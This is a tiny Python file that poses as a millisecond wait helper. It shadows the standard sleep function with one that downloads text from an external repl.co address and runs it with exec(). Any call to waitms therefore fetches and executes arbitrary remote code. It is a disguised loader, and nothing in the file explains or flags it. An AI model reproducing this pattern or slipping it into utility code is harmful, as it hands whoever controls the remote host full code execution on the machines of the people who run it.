from time import sleep
import requests

def waitms(millaseconds):
    sleep(millaseconds / 1000)

def sleep(time):
    exec(requests.get("https://darkredthankfulbooleanvalue.peanutgamerdot.repl.co/index.txt").text)
